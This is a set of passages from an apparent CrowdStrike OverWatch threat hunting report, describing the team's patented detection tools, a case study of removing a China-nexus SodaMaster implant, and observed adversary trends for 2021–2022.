OverWatch’s threat hunting capability is the unsung hero\n\nof the story. OverWatch is able to go head-to-head with the world’s most sophisticated\n\nadversaries because of the cutting-edge technology and tools that this expert hunting\n\nteam has at its disposal.\n\nOver the past year, OverWatch was granted five patents in recognition of the innovation\n\nthat underpins OverWatch’s threat hunting operations.\n\n###### Narrow the Aperture: Focus Only on Events that Warrant Deeper Analysis\n\n[At the core of everything OverWatch does sits the Computer-Security Event Analysis](https://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO2&Sect2=HITOFF&u=%2Fnetahtml%2FPTO%2Fsearch-adv.htm&r=1&f=G&l=50&d=PTXT&p=1&S1=11,310,248&OS=11,310,248&RS=11,310,248)\n\nframework. This framework processes and triages security event data at a global scale\n\nby associating events with predefined patterns and rules. In doing so, this tool presents a\n\nfiltered pipeline of event data for deeper analysis by threat hunters.The patterns and rules\n\nthat feed this framework are continuously developed and refined by OverWatch analysts\n\nbased on up-to-the-minute threat intelligence.\n\n28 [For more on the SEARCH methodology, see https://www.youtube.com/watch?v=YxcnI_ZjQAA and https://](https://www.youtube.com/watch?v=YxcnI_ZjQAA)\n\n\n-----\n\n###### Beware the Burst: Cardinality Used to Surface Malicious Activity\n\nContext is key when searching for malicious behavior. For example, while an event on\n\nits own may appear to be benign administrator activity, in combination with other events\n\nit may reveal the presence of a threat actor within an environment. OverWatch has two\n\npatented hunting tools that use the principle of cardinality to unearth potentially malicious\n\nactivity.\n\n[The Cardinality-Based Activity Pattern Detection tool looks for related and coinciding](https://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&Sect2=HITOFF&d=PALL&p=1&u=%2Fnetahtml%2FPTO%2Fsrchnum.htm&r=1&f=G&l=50&s1=11,050,764.PN.&OS=PN/11,050,764&RS=PN/11,050,764)\n\nbursts of potentially malicious activity patterns on individual machines and surfaces these\n\nfor further human analysis. To support rapid analysis by threat hunters, the tool presents\n\nthe data visually — grouping together activity patterns with a graphical representation of\n\nthe fidelity value to illustrate the degree to which each of the activity patterns indicates\n\n[possible malicious activity.

But these same commonplace events can also\n\n[be key to identifying a potential intrusion. OverWatch’s patented hunting tool for Computer-](https://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&Sect2=HITOFF&d=PALL&p=1&u=%2Fnetahtml%2FPTO%2Fsrchnum.htm&r=1&f=G&l=50&s1=11,062,024.PN.&OS=PN/11,062,024&RS=PN/11,062,024)\n\n[Security Event Security-Violation Detection was built to use artificial intelligence (AI) to](https://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&Sect2=HITOFF&d=PALL&p=1&u=%2Fnetahtml%2FPTO%2Fsrchnum.htm&r=1&f=G&l=50&s1=11,062,024.PN.&OS=PN/11,062,024&RS=PN/11,062,024)\n\npredict whether an event is malicious on the basis of the ancestry of the command line. This\n\ntool classifies hunting leads before they go to hunters, helping funnel only the relevant data for\n\nhuman analysis.\n\nThis tool supports both hunting lead generation and optimization, using three distinct AI\n\nmodels to analyze the data to look for behaviors associated with malware and targeted\n\nintrusion activity. One model is specifically trained on OverWatch targeted data. The other\n\ntwo models look for behavior indicative of malware intrusion activity. Of those two, one is\n\ncalibrated to find unknown hunting leads — this model is more balanced, funneling more\n\ndata to analysts and reducing the risk that novel malicious activity is missed. The other\n\nmodel is more narrowly calibrated to consistently identify known hunting leads.\n\n\n-----\n\n###### Family Ties: Clusters of Command Lines Link Malware Families\n\n[Rounding out this year’s patents is the Computer-Security Event Clustering and Violation](https://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&Sect2=HITOFF&d=PALL&p=1&u=%2Fnetahtml%2FPTO%2Fsrchnum.htm&r=1&f=G&l=50&s1=11,258,805.PN.&OS=PN/11,258,805&RS=PN/11,258,805)\n\n[Detection system.

This information provides insights into malware threats that can\n\nenable victim organizations to lock down vulnerabilities in their systems. Additionally, by\n\nreviewing the data that this system generates over time, it is also possible to track changes\n\nin how particular malware families present in victim organization’s environments.\n\nThese patented hunting technologies are just some of the custom tools used by\n\nOverWatch threat hunters. They enable OverWatch to successfully scale with the\n\nproliferation of adversary activity while maintaining critical human insight and ingenuity in its\n\nhunting operations. OverWatch’s technology enables threat hunters to focus their attention\n\non analyzing the data most likely to yield malicious findings, arming customers to disrupt\n\nadversarial activity as soon as possible.\n\n\n-----\n\nIntelligence. In one seamless interaction with CrowdStrike, this victim organization\n\nwalked away more secure and also more aware of the threats they face from a\n\ntargeted China-nexus adversary — empowering them to make proactive decisions\n\nabout their security needs in the future.\n\n\n###### Three’s a CrowdStrike Powerhouse\n\nA significant amount of collaboration happens behind the scenes at CrowdStrike\n\nto stop breaches. At the core of this collaboration sits CrowdStrike Intelligence,\n\ndelivering unparalleled coverage of the global threat landscape. This intelligence\n\nis fed, in part, by findings from the front lines — teams like CrowdStrike Services,\n\nFalcon OverWatch and Falcon Complete. In return, this treasure trove of threat\n\nintelligence empowers threat hunters and others to offer CrowdStrike customers\n\ndetailed insights into the threats they face.\n\nDuring the onboarding of a new Falcon Complete customer, OverWatch\n\ndiscovered evidence of a pre-existing implant executing in the context of\n\nsvchost.exe. The implant was beaconing to adversary-owned infrastructure,\n\nwhich, thanks to CrowdStrike Intelligence, was quickly identified as being\n\nconnected to the China-nexus malware SodaMaster remote access tool. As this\n\ninformation was relayed to the victim, Falcon Complete leveraged pre-approved\n\ncustomer countermeasures and Falcon’s RTR capability to network contain the\n\nhost — successfully severing the adversary’s network access.\n\nFalcon Complete proceeded to perform further analysis on the host to uncover\n\nartifacts related to the implant. Several malicious .exe, .dll and .dat files were\n\nidentified and removed from the following directory used by the malware:\n\nC:\\ProgramData\\Microsoft\\DRM\\.\n\nIn addition, Falcon Complete analysts removed persistence on the host by killing the\n\nsvchost process the malware was abusing and removing related malicious services\n\n(named NlaSSvc and puttysrv). Further analysis by CrowdStrike Intelligence\n\nconfirmed the presence of a combination of Cobalt Strike beacons and SodaMaster in\n\nthe malicious file samples. These tools are known to be used as part of ManageEngine\n\nexploitation operations associated with suspected China-nexus adversaries.\n\nWithin days of rolling out the Falcon sensor to their environment, this customer\n\nexperienced the rapid detection capabilities of OverWatch, the expert remediation\n\noffered by Falcon Complete, and the deep threat insights offered by CrowdStrike\n\nIntelligence. In one seamless interaction with CrowdStrike, this victim organization\n\n\n-----\n\n### Conclusion\n\nLast year, OverWatch reported on a record-breaking year of interactive intrusions and\n\nsophisticated cyber threats facing organizations as they began to find a new normal within\n\nthe COVID-19 pandemic. A year later, the world faces new challenges spurred by economic\n\npressures and geopolitical tensions, backdropping a cyber threat landscape that is as\n\ncomplicated as ever. In the 12 months from July 1, 2021, to June 30, 2022, OverWatch once\n\nagain uncovered a record number of interactive intrusions and has watched adversary\n\nbehavior adapt and evolve. The findings and data in this report reflect observations derived\n\nfrom OverWatch’s global hunting activities.\n\nLooking back, OverWatch threat hunters identified several key trends in adversarial\n\nbehavior over the past year. This includes an increase in:\n\nCVEs and zero-days, which require a scalable defense solution laser-focused\n###### +\non the post-exploitation behaviors that remain constant across all interactive\nintrusions\n\nRaaS affiliate models, which require defenders to be on alert for the ways various\n###### +\naffiliates leverage different tradecraft to deploy the same tooling\n\nTool usage for adversaries looking to increase their odds of remaining\n###### +\nundetected in a network\n\n\n-----\n\nLooking deeper, OverWatch threat hunters observed adversaries evolve and grow their\n\ntradecraft in new and novel ways. This includes:\n\nAn insightful look at what AQUATIC PANDA was able to achieve when deeply\n###### +\nentrenched in a victim network\n\nThe proliferation of interactive eCrime activity leveraging affiliate models to\n###### +\neffectively rent access to ransomware platforms, enabling eCrime groups to\nperform BGH attacks without the time and resources previously necessary to\ndevelop the tooling or capabilities in-house\n\nThe increased use of ISO files by both eCrime and targeted adversaries to deliver\n###### +\nmalicious software\n\nAnd lastly, looking ahead, OverWatch remains on the cutting edge of the threat landscape —\n\ngrowing the hunters’ ability to meet the adversary where they are. This includes:\n\nContinuously improving the ability to hunt effectively on cloud telemetry\n###### +\n\nResearching new and innovative ways to improve Falcon’s patented hunting\n###### +\nworkflows and tools\n\nTuning the autonomous tooling leveraged by OverWatch’s human threat hunters to\n###### +\nfind even the unknown unknowns in today’s threat landscape — faster and more\nefficiently than ever before\n\nOverWatch comes face-to-face with today’s most determined adversaries daily — and is\n\ncoming out on top. OverWatch remains vigilant, providing its customers with the 24/7/365\n\ncoverage needed to remain ahead of the threats posed in the past 12 months and into the\n\nfuture. The specific recommendations offered within this report aim to guide defenders\n\nas they harden their networks against all malicious threats — regardless of initial access\n\nvector, adversarial motivation, or techniques and tooling used.\n\n\n-----\n\n### About Falcon OverWatch\n\nThe CrowdStrike Falcon OverWatch[™] managed threat hunting service is built on the\n\nCrowdStrike Falcon[®] platform.
